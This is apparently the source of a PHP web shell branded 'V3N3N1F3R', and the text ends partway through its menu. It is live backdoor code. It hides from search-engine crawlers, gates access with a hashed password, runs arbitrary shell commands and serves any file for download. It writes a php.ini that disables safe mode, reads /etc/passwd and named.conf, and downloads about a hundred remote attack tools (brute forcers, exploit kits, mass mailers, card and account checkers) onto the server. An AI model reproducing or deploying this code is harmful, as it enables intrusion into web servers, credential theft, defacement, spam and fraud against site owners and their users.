<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
 
$namesite = $_SERVER['HTTP_HOST'];
$auth_pass = "0d85625b9a06bce859ffb7cad5e0030f";

$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "
Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
$pass = "0d85625b9a06bce859ffb7cad5e0030f"; 
function login_shell() {
$user = @get_current_user();
$site = $_SERVER['HTTP_HOST'];
?>
<html>
<head>
<title>.::V3N3N1F3::.</title>
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
    color: green;
    text-align: center;
    background: url('http://i66.servimg.com/u/f66/14/86/38/04/ground10.gif') repeat center center fixed black;
}
header {
    color: green;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: #000000;
    border: 1px green;
    padding: 5px;
    margin-left: 20px;
    text-align: center;
    box-shadow: 0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red, 0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red;border-radius: 4px;}
}

</style>
</head>
<center>
<header>
<img src="http://www.rubiconadvice.ro/files/nih.png" width="350px" height="300px" style="border:0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red, 0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red;border-radius: 4px;"/>
<br/><br/>
<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<iframe width="0%" height="0" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/297726561&auto_play=true&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&visual=true"></iframe>
 <br>
<form method="post"><font face='iceland' size='5' color='white' style='text-shadow:0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red;'><?php echo $user."</font><font face='iceland' size='6' color='dotted green' style='text-shadow:0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red;'>@</font><font face='iceland' size='5' color='white' style='text-shadow:0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red;'>".$site; ?>:~$</font><br/><br/>
<input type="password" name="pass">
</form>
<style type="text/css">
  h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}


.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
.jokitz1{
  text-align : center;
  }
.jokitz2{
  text-align : center;
  font-family : Courier;
  }
</style>
<script type="text/javascript" language="javascript">
<!--

var rows=1; // must be an odd number

var speed=10; // lower is faster

var reveal=2; // between 0 and 2 only. The higher, the faster the word appears

var effectalign="center" //enter "center" to center it.

var w3c=document.getElementById && !window.opera;;

var ie45=document.all && !window.opera;

var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;

var m_coch=new Array();

var m_copo=new Array();


window.onload = function() {

  if (!w3c && !ie45) return

  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];

  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;

  ma_txt=" "+ma_txt+" ";

  columns=ma_txt.length;

  if (w3c) {

    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);

    ma_tab=document.createElement("table");

    ma_tab.setAttribute("border", 0);

    ma_tab.setAttribute("align", effectalign);

    ma_tab.style.backgroundColor="#000000";

    ma_bod=document.createElement("tbody");

    for (x=0; x<rows; x++) {

      ma_row=document.createElement("tr");

      for (y=0; y<columns; y++) {

        matemp=document.createElement("td");

        matemp.setAttribute("id", "Mx"+x+"y"+y);

        matemp.className="matrix";

        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));

        ma_row.appendChild(matemp);

      }

      ma_bod.appendChild(ma_row);

    }

    ma_tab.appendChild(ma_bod);

    matrix.appendChild(ma_tab);

  } else {

    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';

    for (var x=0; x<rows; x++) {

      ma_tab+='<t'+'r>';

      for (var y=0; y<columns; y++) {

        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';

      }

      ma_tab+='</'+'tr>';

    }

    ma_tab+='</'+'table>';

    matrix.innerHTML=ma_tab;

  }

  ma_cho=ma_txt;

  for (x=0; x<columns; x++) {

    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));

    m_copo[x]=0;

  }

  ma_bod=setInterval("mytricks()", speed);

}

function parah($pastebin, $nama_file){
    $usa = file_get_contents("$pastebin");
    $frr = fopen("$nama_file", 'w');
    fwrite($frr, $usa);
}

function mytricks() {

  x=0;

  for (y=0; y<columns; y++) {

    x=x+(m_copo[y]==100);

    ma_row=m_copo[y]%100;

    if (ma_row && m_copo[y]<100) {

      if (ma_row<rows+1) {

        if (w3c) {

          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);

          matemp.firstChild.nodeValue=m_coch[y];

        }

        else {

          matemp=document.all["Mx"+(ma_row-1)+"y"+y];

          matemp.innerHTML=m_coch[y];

        }

        matemp.style.color="#81F2FF";

        matemp.style.fontWeight="bold";

      }

      if (ma_row>1 && ma_row<rows+2) {

        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];

        matemp.style.fontWeight="normal";

        matemp.style.color="#00BBFF";

      }

      if (ma_row>2) {

          matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];

        matemp.style.color="#20FFDA";

      }

      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;

      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);

      else if (ma_row<rows+2) m_copo[y]++;

      else if (m_copo[y]<100) m_copo[y]=0;

    }

    else if (Math.random()>0.9 && m_copo[y]<100) {

      m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));

      m_copo[y]++;

    }

  }

  if (x==columns) clearInterval(ma_bod);

}



function zoomer(ycol) {

  var mtmp, mtem, ytmp;

  if (m_copo[ycol]==Math.floor(rows/2)+1) {

    for (ytmp=0; ytmp<rows; ytmp++) {

      if (w3c) {

        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);

        mtmp.firstChild.nodeValue=m_coch[ycol];

      }

      else {

        mtmp=document.all["Mx"+ytmp+"y"+ycol];

        mtmp.innerHTML=m_coch[ycol];

      }

      mtmp.style.color="#5BEEFF";

      mtmp.style.fontWeight="bold";

    }

    if (Math.random()<reveal) {

      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));

      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);

    }

    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);

    m_copo[ycol]+=199;

    setTimeout("zoomer("+ycol+")", speed);

  }

  else if (m_copo[ycol]>200) {

    if (w3c) {

      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);

      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);

    }

    else {

      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];

      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];

    }

    mtmp.style.fontWeight="normal";

    mtem.style.fontWeight="normal";

    setTimeout("zoomer("+ycol+")", speed);

  }

  else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);

  if (m_copo[ycol]>100 && m_copo[ycol]<200) {

    if (w3c) {

      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);

      mtmp.firstChild.nodeValue=String.fromCharCode(160);

      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);

      mtem.firstChild.nodeValue=String.fromCharCode(160);

    }

    else {

      mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];

      mtmp.innerHTML=String.fromCharCode(160);

      mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];

      mtem.innerHTML=String.fromCharCode(160);

    }

    setTimeout("zoomer("+ycol+")", speed);

  }

  
//start

var h1 = document.getElementsByTagName("h1")[0],

text = h1.innerText || h1.textContent,

split = [], i, lit = 0, timer = null;

for(i = 0; i < text.length; ++i) {

split.push("<span>" + text[i] + "</span>");

}

h1.innerHTML = split.join("");

split = h1.childNodes;



var flicker = function() {

lit += 0.01;

if(lit >= 1) {

clearInterval(timer);

}

for(i = 0; i < split.length; ++i) {

if(Math.random() < lit) {

split[i].className = "neon";

} else {

split[i].className = "";

}

}

}

setInterval(flicker, 100);



}

//strat sec



// end  -->
 

</script>
<h1> V3N3N1F3R </h1>

  <center><font color="aqua"><font SIZE="3">::  _THANKS TO_  ::</font></font></center>

<div id="matrix" class="auto-style8">-=<| ???????? - ???????? | ???????? | ???????? | ???????? | ???????? |>=-</div>

<?php 
exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) ) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else if (md5($_POST['pass']) == $pass){
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell($user,$namesite);
    }
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<center>
<title>.::V3N3N1F3R::.</title>
<meta name='author' content='V3N3N1F3R'>
<meta charset="UTF-8">
<center><style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background-image: url(http://jonvilma.com/images/anime-6.jpg);    color: white;
    font-family:'ubuntu';
    font-size: 13px;
    width: 100%;
    background-color: black;
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
    background-attachment: fixed;
}
li {
    display: inline;
    margin: 5px;
    padding: 5px;
}
table, th, td {
    border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
    font-family: 'Ubuntu';
    font-size: 13px;
}
.table_home, .th_home, .td_home {
    border: 1px solid #1435DD;
}
th {
    padding: 10px;
}
a {
    color: #ffffff;
    text-decoration: none;
}
a:hover {
    color: gold;
    text-decoration: underline;
}
b {
    color: gold;
}
input[type=text], input[type=password],input[type=submit] {
    background: transparent; 
    color: #ffffff; 
    border: 1px solid #ffffff; 
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'abel';
    font-size: 13px;
}
textarea {
    border: 1px solid #ffffff;
    width: 100%;
    height: 400px;
    padding-left: 5px;
    margin: 10px auto;
    resize: none;
    background: black;
    color: #ffffff;
    font-family: Tahoma;
    font-size: 14px;
}
select {
    width: 152px;
    background: #000000; 
    color: cyan; 
    border: 1px solid #ffffff; 
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'abel';
    font-size: 13px;
}
option:hover {
    background: cyan;
    color: #dc00ff;
}

</style>
</head>
<style type='text/css'>
@import url('https://fonts.googleapis.com/css?family=Jolly+Lodger');
html { font-family: 'Times New Roman';
    font-size: 12px;
    width: 100%;
}
li {
    display: inline;
    margin: 2px;
    padding: 2px;
}

#menu{
    background:none;
    margin:8px 2px 4px 2px;
}
#menu a {
                padding:2px 10px;  
                margin:0; 
                background:#000080; 
                text-decoration:none; 
                letter-spacing:2px; 
                padding: 2px 10px;
                margin: 0;
                background:#000080;
                text-decoration: none;
                letter-spacing: 2px;
                border-radius: 2px;
                border-bottom: 2px solid #B5AFAF;
                border-top: 2px solid #B5AFAF;
                border-right: 2px solid darkblue;
                border-left: 2px solid darkblue;
                            -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
}

       #menu a:hover {
            background:#180000; 
            border-bottom:0px solid #333333; 
            border-top:0px solid #333333; 
       }
table tr:first-child{   
    background: #800080;
    text-align: center;
    color: white;
}
table, th, td {
    border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
    font-family: 'Share Tech Mono';
    font-size: 14px;
}
.table_home, .th_home, .td_home {
    border: 1px solid blue;
}
th {
    padding: 10px;
}
a {
    color: aqua;
    text-decoration: none;
}
a:hover {
    color: yellow;
    text-decoration: underline;
}
b {
    color: blue;
}
       #menu a:hover {
            background:#180000; 
            border-bottom:0px solid #333333; 
            border-top:0px solid #333333; 
       }
#menu a:hover{
    background:#191919;
    border-bottom:1px solid #333333;
    border-top:1px solid #333333;
}
</style>
</head>
<center>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}      
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=#FDF105>".$perm."</font>";
    }
}
function exe($cmd) {    
if(function_exists('system')) {         
        @ob_start();        
        @system($cmd);      
        $buff = @ob_get_contents();         
        @ob_end_clean();        
        return $buff;   
    } elseif(function_exists('exec')) {         
        @exec($cmd,$results);       
        $buff = "";         
        foreach($results as $result) {          
            $buff .= $result;       
        } return $buff;     
    } elseif(function_exists('passthru')) {         
        @ob_start();        
        @passthru($cmd);        
        $buff = @ob_get_contents();         
        @ob_end_clean();        
        return $buff;   
    } elseif(function_exists('shell_exec')) {       
        $buff = @shell_exec($cmd);      
        return $buff;   
    } 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
}
function CreateTools($names,$lokasi){
    if ( $_GET['create'] == $names ){
        $a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/1nd3x/".$names.".php";
if (file_exists('1nd3x/'.$names.'.php')){
    echo '<script type="text/javascript">alert("Done");window.location.href = "1nd3x/'.$names.'.php";</script> ';
    }
    else {mkdir("1nd3x", 0777);
file_put_contents('1nd3x/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "1nd3x/'.$names.'.php";</script> ';}}}

CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("dhanus","http://pastebin.com/raw/v4xGus6X");
CreateTools("tmpshell","http://pastebin.com/raw/ZNws1uuh");
CreateTools("uploader","http://pastebin.com/raw/t1xCDetH");
CreateTools("fileuploadphpmyadmin","https://pastebin.com/raw/FQnzB4Ed");
CreateTools("b374k","https://pastebin.com/raw/kUDqwhcw");
CreateTools("merica","https://pastebin.com/raw/FH4bkCjG");
CreateTools("act","https://pastebin.com/raw/QMUPdpT2");
CreateTools("brudul","https://pastebin.com/raw/m5xt2tkN");
CreateTools("minishell","https://pastebin.com/raw/ECstNap8");
CreateTools("idx","https://pastebin.com/raw/vwR36KQe");
CreateTools("badcode","https://pastebin.com/raw/S4PTh4Zt");
CreateTools("noname","https://pastebin.com/raw/GihVJx7M");
CreateTools("terserah","https://pastebin.com/raw/hUhtziUF");
CreateTools("1337cpcrack","https://pastebin.com/raw/MZgnsMph");
CreateTools("md5cheker","https://pastebin.com/raw/CtPsRW4V");

CreateTools("bsm","https://pastebin.com/raw/quFvZCsC");
CreateTools("mailersender","https://pastebin.com/raw/fqAC5z8x");
CreateTools("priv8","http://w32.info/");
CreateTools("cccheker","https://www.tools4noobs.com/online_tools/credit_card_validate/");
CreateTools("ppcheker","http://kevin-al.blogspot.co.id/2016/07/paypal-valid-email-checker-fresh.html");
CreateTools("amazoncheker","http://mr.who.timecapsule.my/amazon.php");
CreateTools("ppemail","https://pastebin.com/raw/XqYDYJdx");
CreateTools("smtp","https://pastebin.com/raw/rsxFPeUJ");
CreateTools("hotmailinbox","https://pastebin.com/raw/VQViJAuZ");
CreateTools("MassMailerbyF4jzar-xCyb3r207","https://pastebin.com/raw/MPE4qA3t");
CreateTools("MassMaillerInbox","https://pastebin.com/raw/zRgTLeDe");
CreateTools("EmailFilter","https://pastebin.com/raw/iBU0PxHF");
CreateTools("amazonemailchecker","https://pastebin.com/raw/yfekEGHB");
CreateTools("ebayemailchecker","https://pastebin.com/raw/DCcEpdsg");
CreateTools("databaseemailsextractor","https://pastebin.com/raw/AEpR3yUf");
CreateTools("bukalapakaccountchecker","https://pastebin.com/raw/ijTWjTx1");
CreateTools("tokopediachecker","https://pastebin.com/raw/RCFsMU1m");

CreateTools("MagentoCMSBruteForceAdminLogin","https://pastebin.com/raw/xBm9hkJj");
CreateTools("CSRFXploiterOnline","https://pastebin.com/raw/hNYtB9uD");
CreateTools("WordPressU-DesignThemesUploadifyDorker","https://pastebin.com/raw/SugbQ2JF");
CreateTools("ShellShockXploiter","https://pastebin.com/raw/mSbapdPk");
CreateTools("ShellShockAutoXploitReverseShell","https://pastebin.com/raw/9Pz9BuGW");
CreateTools("WebdavMassXploiterIP","https://pastebin.com/raw/6RtnBXdU");
CreateTools("POPOJICMSAddAdminAutoRegistration","https://pastebin.com/raw/8Zgt6Dyt");
CreateTools("SQLDorkScannerviaBingDorker","https://pastebin.com/raw/5c5QeHWk");
CreateTools("PrestashopModulesBlocktestimonialFileUpload","https://pastebin.com/raw/pggutE9g");
CreateTools("WebConsole","https://pastebin.com/raw/55U7JQKq");
CreateTools("LocalRootExploiter","https://pastebin.com/raw/zazkeBhp");
CreateTools("binchecker","https://pastebin.com/raw/6YqkMJNt");
CreateTools("drupalcore","https://pastebin.com/raw/Gu8TVM4D");
CreateTools("krimou","https://pastebin.com/raw/65T9PsSD");
CreateTools("massrevslider","https://pastebin.com/raw/H3jxh85J");
CreateTools("extract","https://pastebin.com/raw/mPrZnL0z");
CreateTools("reverseiplookup","https://pastebin.com/raw/78suuEVr");
CreateTools("safemode","https://pastebin.com/raw/Aw5kdpDZ");
CreateTools("symlinkbased","https://pastebin.com/raw/2B4q1Aua");
CreateTools("ConfigWordpressandJoomlaGrabber","https://pastebin.com/raw/pU4W4ZG9");
CreateTools("WP2","https://pastebin.com/raw/iZ7p8Yer");
CreateTools("autocreatesudomain","https://pastebin.com/raw/3fjCAA32");
CreateTools("MiniMassAutoXploiterOnlyToolsv1.0","https://pastebin.com/raw/TycS3kyn");
CreateTools("SCANSERVER","https://pastebin.com/raw/dc0ifz9s");
CreateTools("ownLFI|t00lkitv1.0","https://pastebin.com/raw/TVYGG6Cm");
CreateTools("PHPInfo","https://pastebin.com/raw/P0n2hJYk");
CreateTools("m0bil3xTSQLiScanner","https://pastebin.com/raw/sVqaEu5L");
CreateTools("ExploitsWordpressLFD","https://pastebin.com/raw/4hTLL5TV");
CreateTools("xSec-BackDoorGenerator","https://pastebin.com/raw/h10CHhbg");
CreateTools("Bypass[LiteSpeed-Nginx-Apache]","https://pastebin.com/raw/7BGc9Dcx");
CreateTools("UploadFileUsingfile_get_contents","https://pastebin.com/raw/Hc9die2K");
CreateTools("ProxyByRoot","https://pastebin.com/raw/rrCD0Mvn");
CreateTools("ReadFileUsing3Function","https://pastebin.com/raw/jXqRXVsS");
CreateTools("MySQLQueryCommandExecute","https://pastebin.com/raw/v1Wq6avm");
CreateTools("CreateHtaccess","https://pastebin.com/raw/bqGe05Fc");
CreateTools("SimpleBypasser","https://pastebin.com/raw/szk2PMfh");
CreateTools("SearchForBlindSQLInjectionvBulltein","https://pastebin.com/raw/nq28fY8v");
CreateTools("GetallSite","https://pastebin.com/raw/fs77hwNb");
CreateTools("ScannerSh3LL","https://pastebin.com/raw/UDS6Z49k");
CreateTools("BypassSuPHPVersion2[Sfa7trick]","https://pastebin.com/raw/ARmNUeMS");
CreateTools("ExtractUsersFromPasswd","https://pastebin.com/raw/j7PNhzBa");
CreateTools("BypassMethodNotimplemented","https://pastebin.com/raw/YiJBG0EB");
CreateTools("GetWordpressUser","https://pastebin.com/raw/Sanh5pwV");
CreateTools("WordpressKiller","https://pastebin.com/raw/R6cx1m57");
CreateTools("3mlaqGamesExploitByxSecurity","https://pastebin.com/raw/R72xMbL8");
CreateTools("ExtractEmails","https://pastebin.com/raw/KSyFqBaz");
CreateTools("SearchForExploitViaExploit-DB","https://pastebin.com/raw/sbbAF9b3");
CreateTools("Extract[id-username-password-salt-email]","https://pastebin.com/raw/nSP6edw9");
CreateTools("GetToolsFromYourAppServ","https://pastebin.com/raw/xjdUUVY0");
CreateTools("Checkingjoomla1.6-1.7Registration","https://pastebin.com/raw/Z9PCsZyj");
CreateTools("LoginFormWithSESSIONWithoutConnectToDatabase","https://pastebin.com/raw/PFtN2Nyj");
CreateTools("GenerateXMLPluginvBulletin[ajax.php]","https://pastebin.com/raw/ynJiFvET");
CreateTools("RCIJoomlaExploitPHPVersion","https://pastebin.com/raw/5G14CVaN");
CreateTools("KleejaXMLPluginGenerator","https://pastebin.com/raw/1S54W5Tq");
CreateTools("JoomlaBruteForce","https://pastebin.com/raw/D2CLHxeS");
CreateTools("4imagesBruteForce","https://pastebin.com/raw/Pc2e6LxR");
CreateTools("BruteForceAllWordpressOnServer","https://pastebin.com/raw/i42SN5z1");
CreateTools("SkypeBruteForcePHPVersion","https://pastebin.com/raw/sjEeHwtk");
CreateTools("twitterbruteforce","https://pastebin.com/raw/duJhmXKs");
CreateTools("Ask.FmBruteForceByxSecurity","https://pastebin.com/raw/uwqMW0pV");
CreateTools("DimofinfBruteForce","https://pastebin.com/raw/h0w1emPW");
CreateTools("grabbersqlisitesfromip","https://pastebin.com/raw/nMFKHzAa");
CreateTools("ProtectFolderViaHtaccess","https://pastebin.com/raw/3NcMbhNd");
CreateTools("AddHttp","https://pastebin.com/raw/HxkQf1La");
CreateTools("WordPressNativeChurchthemeLFIscanner","https://pastebin.com/raw/dMjmXHvV");
CreateTools("kumpulanlocalroot","http://www.anoncyberteam.org/2018/01/kumpulan-exploit-localroot.html");
CreateTools("bypasscloudflare","https://pastebin.com/raw/kDYVABNx");
CreateTools("allbypass","https://pastebin.com/raw/2qgmjf3A");



if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($_GET['dir']);
} else {
    $dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=#FDF105>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=#FDF105>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#FDF105>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#FDF105>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=#FDF105>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=#FDF105>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=#FDF105>NONE</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$d0mains = @file("/etc/named.conf");
            $users=@file('/etc/passwd');
        if($d0mains)
        { 
            $count;  
            foreach($d0mains as $d0main)
            {
                if(@ereg("zone",$d0main))
                {
                    preg_match_all('#zone "(.*)"#', $d0main, $domains);
                    flush();
                    if(strlen(trim($domains[1][0])) > 2)
                    {
                        flush();
                        $count++;
                    } 
                }
            }
        }

$sport=$_SERVER['SERVER_PORT'];
echo "<table style='width:100%'>";
echo "<tr><td>System: <font color=#FDF105>".php_uname()."</font></td></tr>";
echo "<tr><td>User: <font color=#FDF105>".$user."</font> (".$uid.") Group: <font color=#FDF105>".$group."</font> (".$gid.")</td></tr>";
echo "<tr><td>Server IP: <font color=#FDF105>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=#FDF105>".$_SERVER['REMOTE_ADDR']."</font></td></tr>";
echo "<tr><td>HDD: <font color=#FDF105>".hdd(disk_free_space("/"))."</font> / <font color=#FDF105>".hdd(disk_total_space("/"))."</font></td></tr>";
echo "<tr><td>Websites :<font color=#FDF105> $count </font> Domains</td></tr>";
echo "<tr><td>Port :<font color=#FDF105>  $sport</font> </td></tr>";
echo "<tr><td>Safe Mode: $sm</td></tr>";
echo "<tr><td>Disable Functions: $show_ds</td></tr>";
echo "<tr><td>MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </td></tr>";
echo "<tr><td>Current DIR: ";
foreach($scdir as $c_dir => $cdir) {    
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
    }
    echo "'>$cdir</a>/";
}
echo "</td></tr></table><hr>";
echo "<div id='menu'>";
echo "<li><b><a href='?'>Home</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=upload'>Upload</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=cmd'>Command</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=mass_deface'>Mass Deface</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=config'>Config</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=lcf'>LiteSpeed Config</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=jumping'>Jumping</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=symlink'>Symlink</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=symlink2'>Symlink V.2</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=adminer'>Adminer</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=fake_root'>Fake Root</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=reverse'>ReverseIP</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=cpanel'>CPanel Crack</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=smtp'>SMTP Grabber</a></b></li>";
